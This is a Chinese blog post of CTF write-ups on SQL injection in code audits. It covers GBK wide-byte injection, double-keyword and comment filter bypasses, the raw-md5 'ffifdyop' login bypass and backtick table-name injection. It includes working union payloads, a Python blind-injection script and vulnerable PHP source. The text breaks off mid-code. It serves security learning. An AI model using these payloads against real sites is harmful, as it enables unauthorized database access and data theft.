<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="代码审计之SQL注入"><meta name="keywords" content="SQL 注入,代码审计"><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>代码审计之SQL注入 | J0k3r's Blog</title><link rel="shortcut icon" href="/img/fav.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?9e8a6ba1f41c0d7b000fcfd73f1c7929";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();</script><link rel="dns-prefetch" href="https://www.google-analytics.com"><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-159554347-1', 'auto');
ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#GBK-Injection"><span class="toc-number">1.</span> <span class="toc-text">GBK Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bugku-xor-sql"><span class="toc-number">2.</span> <span class="toc-text">bugku-xor-sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login"><span class="toc-number">3.</span> <span class="toc-text">Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IN-A-Mess"><span class="toc-number">4.</span> <span class="toc-text">IN A Mess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#inject"><span class="toc-number">5.</span> <span class="toc-text">inject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-1"><span class="toc-number">6.</span> <span class="toc-text">Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#因缺思汀的绕过"><span class="toc-number">7.</span> <span class="toc-text">因缺思汀的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#程序逻辑问题"><span class="toc-number">8.</span> <span class="toc-text">程序逻辑问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge1"><span class="toc-number">9.</span> <span class="toc-text">Challenge1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Error-Injection"><span class="toc-number">10.</span> <span class="toc-text">Error Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#update注入"><span class="toc-number">11.</span> <span class="toc-text">update注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Are-you-brave-enough"><span class="toc-number">12.</span> <span class="toc-text">Are you brave enough?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wanna-to-see-your-hat"><span class="toc-number">13.</span> <span class="toc-text">wanna to see your hat?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Naughty-ads"><span class="toc-number">14.</span> <span class="toc-text">Naughty ads</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center">求知若饥，虚心若愚</div><div class="follow-button"><a href="https://github.com/zhuxianjin">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">37</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">36</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2020/02/01/sHdohVBU8nlmARP.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/links/">友链</a><a class="site-page" href="/about/">关于我</a></span></div><div id="post-info"><div id="post-title">代码审计之SQL注入</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-08-07</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p><strong>一些和sql注入有关的代码审计题目</strong></p>
<a id="more"></a>
<h3 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h3><p><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">GBK Injection</a></p>
<p>单引号会被/注掉，可以用%df吃掉/封闭id</p>
<!--more-->
<p>查询字段数</p>
<p><code>?id=-1%df&#39; order by 2%23</code></p>
<p>果然两个，顺带查看其用户，库名和版本</p>
<p><code>?id=-1%df&#39; union select 1,concat_ws(char(32,58,32),user(),database(),version())%23</code></p>
<p>库名sae-chinalover,再爆表</p>
<p>单引号会被/注掉，所以写sae-chinalover的16进制</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da03ca6f9c.png" alt="9.png"></p>
<p><code>?id=-1%df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 0x7361652d6368696e616c6f766572)%23</code></p>
<p>有四个：ctf,ctf2,ctf3,ctf4,news，爆列名</p>
<p><code>?id=-1%df&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 0x7361652d6368696e616c6f766572 and table_name=0x63746634)%23</code></p>
<p>ctf4里有id,flag,flag应该就在这里</p>
<p><code>?id=-1%df&#39; union select 1,(select group_concat(id,flag) from ctf4)%23</code></p>
<p><img src="https://i.loli.net/2018/07/29/5b5da0a6936d1.png" alt="1.png"></p>
<h3 id="bugku-xor-sql"><a href="#bugku-xor-sql" class="headerlink" title="bugku-xor-sql"></a>bugku-xor-sql</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1^1;</span><br><span class="line">+-----+</span><br><span class="line">| 1^1 |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1^0;</span><br><span class="line">+-----+</span><br><span class="line">| 1^0 |</span><br><span class="line">+-----+</span><br><span class="line">|   1 |</span><br><span class="line">+-----+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1^(length(&apos;\&apos;&apos;)&gt;0);</span><br><span class="line">+--------------------+</span><br><span class="line">| 1^(length(&apos;\&apos;&apos;)&gt;0) |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  0 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1^(length(&apos;&apos;)&gt;0);</span><br><span class="line">+------------------+</span><br><span class="line">| 1^(length(&apos;&apos;)&gt;0) |</span><br><span class="line">+------------------+</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p><code>http://123.206.87.240:9004/1ndex.php?id=1^(length(%27an%27)%3E0)#</code></p>
<p><code>http://123.206.87.240:9004/1ndex.php?id=-1%27%20uniunionon%20selselectect%201,(selselectect%20column_name%20from%20infoorrmation_schema.columns%20where%20table_schema%20=0x776562313030322d31%20anandd%20table_name=0x666c616731%20limit%200,1)%23</code></p>
<p><code>usOwycTju+FTUUzXosjr</code></p>
<p><code>http://123.206.87.240:9004/1ndex.php?id=-1%27%20uniunionon%20selselectect%201,(selselectect%20address%20from%20flag1)%23</code></p>
<p><code>Once_More.php</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">rs = requests.Session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag2</span><span class="params">()</span>:</span></span><br><span class="line">    flag =<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        temp = <span class="string">'!@$%^&amp;*()_+=-|&#125;&#123;POIU YTREWQASDFGHJKL:?&gt;&lt;MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./1234567890`~'</span></span><br><span class="line">        key = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> temp:</span><br><span class="line">            url = <span class="string">"http://123.206.87.240:9004/Once_More.php?id=1'and (select locate(binary'"</span>+str(i)+<span class="string">"',(select flag2 from flag2),"</span>+str(j)+<span class="string">"))="</span>+str(j)+<span class="string">"%23"</span></span><br><span class="line">            r1 = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">                <span class="keyword">print</span> str(i)+<span class="string">" -----"</span>+str(j)</span><br><span class="line">                flag += str(i)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[*] : "</span>+flag</span><br><span class="line">                key = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> key ==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    flag2()</span><br></pre></td></tr></table></figure>
<p>LOCATE(substr,str,pos) </p>
<p>返回子串 substr 在字符串 str 中的第 pos 位置后第一次出现的位置。如果 substr 不在 str 中返回 0</p>
<p><code>flag{Bugku-sql_6s-2i-4t-bug}</code></p>
<h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p><a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">题目链接：http://web.jarvisoj.com:32772/</a></p>
<p>这个抓包之后response有个提示</p>
<p><code>Hint: &quot;select * from</code>admin<code>where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot;</code></p>
<p>应该是MD5加密后的sql注入，好像没做过，百度关键字学习下</p>
<ul>
<li>md5(string,raw)</li>
</ul>
<p>string 必需。规定要计算的字符串。 </p>
<p>raw 可选。规定十六进制或二进制输出格式： </p>
<p>•  TRUE – 原始 16 字符二进制格式</p>
<p>•  FALSE – 默认。32 十六进制数</p>
<p>绕过过程为字符串经md5计算后的值经过hex转成字符串后为 ”or’xxx’这样的字符串</p>
<p>构成的sql语句类型为：</p>
<p><code>select * from</code>admin<code>where password=”or’xxx’</code></p>
<p>两个payload：</p>
<blockquote>
<p>content: 129581926211651571912466741651878684928 </p>
</blockquote>
<blockquote>
<p>md5加密为: 06da5430449f8f6f23dfc1276f722738 </p>
</blockquote>
<blockquote>
<p>作hex转字符串: ?T0D??o#??’or’8.N=?</p>
</blockquote>
<blockquote>
<p>content: ffifdyop </p>
</blockquote>
<blockquote>
<p>md5加密为: 276f722736c95d99e921722cf9ed621c </p>
</blockquote>
<blockquote>
<p>作hex转字符串: ‘or’6蒥欓!r,b </p>
</blockquote>
<p>输入ffifdyop</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da0a694a29.png" alt="2.png"></p>
<h3 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h3><p>源码里提示index.phps,其源码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;&lt;!--index.phps--&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&apos;id&apos;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&apos;Location: index.php?id=1&apos;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$a=$_GET[&apos;a&apos;];</span><br><span class="line">$b=$_GET[&apos;b&apos;];</span><br><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;Hahahahahaha&apos;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">	require(&quot;flag.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;work harder!harder!harder!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>关键一行</p>
<p><code>if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</code></p>
<p>baidu下eregi函数可以%00截断，a可以用之前的data://协议实现，php://input也可，那个id得为0，但直接id=0会跳转到初始页面，我就id=0e00绕过了</p>
<p>构造<br><code>?a=data://text/plain,1112 is a nice lab!&amp;id=0e00&amp;b=%0012313</code></p>
<p>得到</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da0a6c2871.png" alt="3.png"></p>
<p>好像是提示进入/^HT2mCpcvOLf这个路径</p>
<p>结果似乎是sql注入</p>
<p>查字段时一加空格就不行，baidu空格绕过，可以使用/<em>注释\</em>/绕过</p>
<p><code>?id=1/*0*/order/*0*/by/*0*/3%23</code></p>
<p>为三个字段，接着查库</p>
<p>搞半天还得双写。。</p>
<p><code>?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,concat_ws(char(32,58,32),user(),database(),version())%23</code></p>
<p><img src="https://i.loli.net/2018/07/29/5b5da0a6c3295.png" alt="4.png"></p>
<p>查所有库</p>
<p><code>?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(schema_name)/*0*/frfromom/*0*/information_schema.schemata%23</code></p>
<p>只有information_schema和test</p>
<p>查test的表</p>
<p><code>?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(table_name)/*0*/frfromom/*0*/information_schema.tables/*0*/where/*0*/table_schema=0x74657374%23</code></p>
<p>只有一个content,查列</p>
<p><code>?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,group_concat(column_name)/*0*/frfromom/*0*/information_schema.columns/*0*/where/*0*/table_schema=0x74657374/*0*/and/*0*/table_name=0x636f6e74656e74%23</code></p>
<p>有id,context,title</p>
<p>最后直接查context</p>
<p><code>?id=-1/*0*/uniunionon/*0*/seselectlect/*0*/1,2,context/*0*/frfromom/*0*/content%23</code></p>
<p>得到flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da0a6c39b0.png" alt="5.png"></p>
<h3 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h3><p>index.php~</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&quot;config.php&quot;);</span><br><span class="line">$table = $_GET[&apos;table&apos;]?$_GET[&apos;table&apos;]:&quot;test&quot;;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,&quot;desc `secret_&#123;$table&#125;`&quot;) or Hacker();</span><br><span class="line">$sql = &quot;select &apos;flag&#123;xxx&#125;&apos; from secret_&#123;$table&#125;&quot;;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line">echo $ret[0];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>反引号是为了区分MySql的保留字段与普通字符而引入的符号</p>
</li>
<li><p>引号一般用在字段的值，如果字段值是字符或字符串，则要加引号</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select `password` from users;</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| password                                 |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| 6885858486f31043e5839c735d99457f045affd0 |</span><br><span class="line">| 6885858486f31043e5839c735d99457f045affd0 |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;passwdord&apos; from users;</span><br><span class="line">+-----------+</span><br><span class="line">| passwdord |</span><br><span class="line">+-----------+</span><br><span class="line">| passwdord |</span><br><span class="line">| passwdord |</span><br><span class="line">+-----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>类似<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc `` ``;</span><br></pre></td></tr></table></figure></p>
<p>的sql语句也是可以的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; desc `users` `union select table_name from information_schema.tables`;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>所以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/?table=test`  `union select table_name from information_schema.tables limit 1,1</span><br></pre></td></tr></table></figure>
<p>查处表名为flag</p>
<blockquote>
<p>LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。LIMIT 接受一个或两个数字参数。</p>
</blockquote>
<blockquote>
<p>为了与 PostgreSQL 兼容，MySQL 也支持句法： LIMIT # OFFSET #</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/?table=flag`  `union select column_name from information_schema.columns limit 1,1</span><br></pre></td></tr></table></figure>
<p>列名为<code>flagUwillNeverKnow</code></p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/?table=test`  `union select flagUwillNeverKnow from secret_flag limit 1,1</span><br></pre></td></tr></table></figure></p>
<p><code>flag{luckyGame~}</code></p>
<h3 id="Login-1"><a href="#Login-1" class="headerlink" title="Login"></a>Login</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$link = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">''</span>);</span><br><span class="line"><span class="keyword">if</span> (!$link) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Could not connect to MySQL: '</span> . mysql_error()); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择数据库</span></span><br><span class="line">$db = mysql_select_db(<span class="string">"test"</span>, $link);</span><br><span class="line"><span class="keyword">if</span>(!$db)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'select db error'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行sql</span></span><br><span class="line">$password = $_GET[<span class="string">'pwd'</span>];</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE pass = '"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</span><br><span class="line">var_dump($sql);</span><br><span class="line">$result=mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">$row1 = mysql_fetch_row($result);</span><br><span class="line">var_dump($row1);</span><br><span class="line"></span><br><span class="line">mysql_close($link);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>sql语句为<code>&quot;SELECT * FROM admin WHERE pass = &#39;&quot;.md5($password,true).&quot;&#39;&quot;</code></p>
<p>若md5后的hex转换成字符串后，如果包含<code>&#39;or&#39;xxx&#39;</code>的字符串</p>
<p>则拼接后构成的语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE pass = &apos;&apos;or&apos;xxx&apos;</span><br></pre></td></tr></table></figure></p>
<p>而字符串ffifdyop，md5后，276f722736c95d99e921722cf9ed621c，转为字符串<code>&#39;or&#39;6?]??!r,??b</code></p>
<p>拼接后的语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE pass = &apos;&apos;or&apos;6?]??!r,??b&apos;</span><br></pre></td></tr></table></figure></p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pwd=ffifdyop</span><br></pre></td></tr></table></figure></p>
<p><code>PCTF{R4w_md5_is_d4ng3rous}</code></p>
<h3 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h3><p><code>&lt;!--source: source.txt--&gt;</code>发现代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"姘村彲杞借垷锛屼害鍙禌鑹囷紒"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span 